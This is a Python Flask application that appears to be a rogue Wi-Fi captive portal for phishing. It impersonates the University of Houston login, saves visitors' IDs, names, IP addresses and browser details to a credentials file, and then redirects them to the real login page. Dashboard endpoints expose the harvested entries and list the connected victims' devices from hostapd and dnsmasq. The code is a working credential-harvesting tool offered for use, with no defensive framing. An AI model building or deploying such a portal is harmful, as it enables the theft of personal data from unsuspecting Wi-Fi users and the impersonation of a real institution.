from flask import Flask, request, redirect, render_template, jsonify, send_from_directory
from flask_cors import CORS
from datetime import datetime
import requests
import os
import ast
import subprocess
import re

app = Flask(__name__, static_folder='static')  # Set the static folder explicitly
CORS(app)  # Enable CORS for development

# Ensure creds directory exists
if not os.path.exists('creds'):
    os.makedirs('creds')
    with open('creds/credentials.txt', 'a') as f:
        pass  # Create empty file

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = {
            'timestamp': datetime.now().isoformat(),
            'uh_id': request.form.get('uid'),
            'first_name': request.form.get('fname'),
            'last_name': request.form.get('lname'),
            'ip': request.remote_addr,
            'ua': request.headers.get('User-Agent')
        }

        # Save to file
        try:
            with open("creds/credentials.txt", "a") as f:
                f.write(f"{data}\n")
        except Exception as e:
            print(f"Error writing to credentials file: {e}")

        return redirect("https://login.uh.edu")

    try:
        return render_template("login.html")
    except Exception as e:
        print(f"Error rendering login template: {e}")
        return str(e), 500

@app.route('/dashboard')
def dashboard():
    try:
        if os.path.exists('frontend/build'):
            return send_from_directory('frontend/build', 'index.html')
        return render_template("dashboard.html")
    except Exception as e:
        print(f"Error serving dashboard: {e}")
        return str(e), 500

@app.route('/api/creds')
def creds_api():
    entries = []
    creds_file = "creds/credentials.txt"
    if os.path.exists(creds_file):
        try:
            with open(creds_file, "r") as f:
                for line in f:
                    try:
                        entry = ast.literal_eval(line.strip())
                        entries.append(entry)
                    except Exception as e:
                        print(f"Error parsing line: {e}")
                        continue
        except Exception as e:
            print(f"Error reading credentials file: {e}")
    return jsonify(entries)

@app.route('/api/connections')
def connections_api():
    try:
        print("[DEBUG] Starting connections_api()")
        # Get connected clients from hostapd with detailed information
        print("[DEBUG] Running hostapd_cli command...")
        hostapd_cli = subprocess.run(['hostapd_cli', '-i', 'wlan0', '-p', '/var/run/hostapd', 'all_sta'], capture_output=True, text=True)
        print(f"[DEBUG] hostapd_cli return code: {hostapd_cli.returncode}")
        print(f"[DEBUG] hostapd_cli output: {hostapd_cli.stdout}")
        
        connected_clients = {}
        current_mac = None
        
        if hostapd_cli.returncode == 0:
            for line in hostapd_cli.stdout.split('\n'):
                line = line.strip()
                if re.match(r'^[0-9A-Fa-f:]{17}$', line):
                    current_mac = line
                    print(f"[DEBUG] Found MAC address: {current_mac}")
                    connected_clients[current_mac] = {
                        'mac_address': current_mac,
                        'signal_strength': None,
                        'connected_time': None,
                        'rx_bytes': None,
                        'tx_bytes': None,
                        'is_connected': True
                    }
                elif current_mac and '=' in line:
                    key, value = line.split('=', 1)
                    if key in ['connected_time', 'rx_bytes', 'tx_bytes', 'signal']:
                        print(f"[DEBUG] Found {key}={value} for {current_mac}")
                    if key == 'connected_time':
                        connected_clients[current_mac]['connected_time'] = int(value)
                    elif key == 'rx_bytes':
                        connected_clients[current_mac]['rx_bytes'] = int(value)
                    elif key == 'tx_bytes':
                        connected_clients[current_mac]['tx_bytes'] = int(value)
                    elif key == 'signal':
                        connected_clients[current_mac]['signal_strength'] = int(value)

        print(f"[DEBUG] Connected clients after hostapd: {connected_clients}")

        # Get DHCP leases from dnsmasq.leases
        print("[DEBUG] Checking dnsmasq.leases file...")
        if os.path.exists('/var/lib/misc/dnsmasq.leases'):
            print("[DEBUG] Found dnsmasq.leases file")
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                leases_content = f.read()
                print(f"[DEBUG] dnsmasq.leases content: {leases_content}")
                for line in leases_content.split('\n'):
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        timestamp, mac, ip, hostname = parts[0:4]
                        print(f"[DEBUG] Found lease: timestamp={timestamp}, mac={mac}, ip={ip}, hostname={hostname}")
                        if mac not in connected_clients:
                            connected_clients[mac] = {
                                'mac_address': mac,
                                'signal_strength': None,
                                'connected_time': None,
                                'rx_bytes': None,
                                'tx_bytes': None,
                                'is_connected': False
                            }
                        connected_clients[mac].update({
                            'ip_address': ip,
                            'hostname': hostname,
                            'lease_timestamp': datetime.fromtimestamp(int(timestamp)).isoformat()
                        })

        # Convert connected_time to human-readable format and calculate transfer rates
        result = []
        for client in connected_clients.values():
            if 'ip_address' in client:
                if client['is_connected'] and client['connected_time']:
                    minutes = client['connected_time'] // 60
                    hours = minutes // 60
                    minutes = minutes % 60
                    client['connection_duration'] = f"{hours}h {minutes}m"
                else:
                    client['connection_duration'] = "Disconnected"
                
                if client['rx_bytes'] and client['tx_bytes']:
                    client['rx_mb'] = round(client['rx_bytes'] / (1024 * 1024), 2)
                    client['tx_mb'] = round(client['tx_bytes'] / (1024 * 1024), 2)
                else:
                    client['rx_mb'] = 0
                    client['tx_mb'] = 0
                
                if client['signal_strength']:
                    client['signal_dbm'] = f"{client['signal_strength']} dBm"
                else:
                    client['signal_dbm'] = "N/A"
                
                # Clean up internal fields
                for field in ['connected_time', 'rx_bytes', 'tx_bytes', 'signal_strength', 'is_connected']:
                    client.pop(field, None)
                
                result.append(client)

        print(f"[DEBUG] Final result: {result}")
        return jsonify(result)
    except Exception as e:
        print(f"[DEBUG] Error in connections_api: {str(e)}")
        print(f"[DEBUG] Error type: {type(e)}")
        import traceback
        print(f"[DEBUG] Traceback: {traceback.format_exc()}")
        return jsonify([])

# Serve React static files
@app.route('/dashboard/static/js/<path:filename>')
@app.route('/dashboard/static/css/<path:filename>')
@app.route('/dashboard/static/media/<path:filename>')
def serve_react_static(filename):
    if filename.startswith('main.'):
        folder = 'js' if '/js/' in request.path else 'css'
        return send_from_directory(f'frontend/build/static/{folder}', filename)
    return send_from_directory('frontend/build/static/media', filename)

# Serve captive portal static files
@app.route('/static/<path:filename>')
def serve_portal_static(filename):
    return send_from_directory('static', filename)

# Serve other React assets
@app.route('/dashboard/manifest.json')
def serve_manifest():
    return send_from_directory('frontend/build', 'manifest.json')

@app.route('/dashboard/favicon.ico')
def serve_favicon():
    return send_from_directory('frontend/build', 'favicon.ico')

@app.route('/dashboard/logo192.png')
def serve_logo():
    return send_from_directory('frontend/build', 'logo192.png')

if __name__ == '__main__':
    print(f"Starting Flask server on port 443...")
    print(f"Templates directory: {os.path.abspath('templates')}")
    print(f"Static directory: {os.path.abspath('static')}")
    print(f"React build directory: {os.path.abspath('frontend/build')}")
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.crt', 'cert.key'), debug=True)
